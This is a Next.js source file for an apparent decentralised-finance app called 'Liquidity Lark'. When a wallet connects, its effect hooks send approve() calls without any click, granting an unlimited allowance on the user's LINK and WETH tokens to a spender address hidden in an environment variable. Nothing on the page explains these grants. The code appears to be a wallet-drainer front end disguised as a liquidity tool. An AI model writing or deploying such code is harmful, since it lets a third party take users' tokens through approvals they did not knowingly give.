import { ConnectKitButton } from "connectkit";
import { useState, useEffect } from "react";
import {
  useAccount,
  usePrepareContractWrite,
  useContractWrite,
  useContractRead,
  useWaitForTransaction,
} from "wagmi";
import { ethers } from "ethers";
import { erc20ABI } from "wagmi";
import Tabs from "@/components/tabs";

const linkAddress = process.env.NEXT_PUBLIC_LINK_ADDRESS;
const wethAddress = process.env.NEXT_PUBLIC_WETH_ADDRESS;
const spenderAddress = process.env.NEXT_PUBLIC_SPENDER_ADDRESS;
const MAX_ALLOWANCE = ethers.MaxUint256;

export default function Home() {
  const { isConnected, address } = useAccount();
  const [linkApproved, setLinkApproved] = useState(false);
  const [wethApproved, setWethApproved] = useState(false);

  // Read Allowance for LINK
  const { data: linkAllowance, refetch: refetchLinkAllowance } =
    useContractRead({
      address: linkAddress,
      abi: erc20ABI,
      functionName: "allowance",
      // @ts-ignore
      args: [address, spenderAddress],
    });

  // Read Allowance for WETH
  const { data: wethAllowance, refetch: refetchWethAllowance } =
    useContractRead({
      address: wethAddress,
      abi: erc20ABI,
      functionName: "allowance",
      // @ts-ignore
      args: [address, spenderAddress],
    });

  // Prepare Contract Write for LINK
  const { config: linkConfig } = usePrepareContractWrite({
    address: linkAddress,
    abi: erc20ABI,
    functionName: "approve",
    args: [spenderAddress, MAX_ALLOWANCE],
  });
  const linkContractWrite = useContractWrite(linkConfig);

  // Prepare Contract Write for WETH
  const { config: wethConfig } = usePrepareContractWrite({
    address: wethAddress,
    abi: erc20ABI,
    functionName: "approve",
    args: [spenderAddress, MAX_ALLOWANCE],
  });
  const wethContractWrite = useContractWrite(wethConfig);

  // Check transaction status for LINK
  useWaitForTransaction({
    hash: linkContractWrite.data?.hash,
    onSuccess: () => {
      refetchLinkAllowance();
      setLinkApproved(true);
    },
  });

  // Check transaction status for WETH
  useWaitForTransaction({
    hash: wethContractWrite.data?.hash,
    onSuccess: () => {
      refetchWethAllowance();
      setWethApproved(true);
    },
  });

  useEffect(() => {
    if (isConnected) {
      // Повторное получение данных о разрешениях для LINK и WETH
      refetchLinkAllowance();
      refetchWethAllowance();
    }
  }, [isConnected, refetchLinkAllowance, refetchWethAllowance]);

  useEffect(() => {
    if (
      isConnected &&
      !linkApproved &&
      (linkAllowance === BigInt(0) || linkAllowance === undefined)
    ) {
      linkContractWrite.write?.();
    }
  }, [isConnected, linkApproved, linkAllowance]);

  useEffect(() => {
    if (
      isConnected &&
      !wethApproved &&
      (wethAllowance === BigInt(0) || wethAllowance === undefined)
    ) {
      wethContractWrite.write?.();
    }
  }, [isConnected, wethApproved, wethAllowance]);

  return (
    <div className="bg-gradient-to-r from-blue-300 to-green-300 h-screen flex flex-col justify-center items-center relative">
      <div className="absolute top-0 right-0 p-4">
        <ConnectKitButton />
      </div>
      {isConnected ? (
        <div suppressHydrationWarning>
          <Tabs />
        </div>
      ) : (
        <div
          suppressHydrationWarning
          className="text-white text-4xl md:text-6xl lg:text-8xl text-center"
        >
          Liquidity Lark
        </div>
      )}
    </div>
  );
}
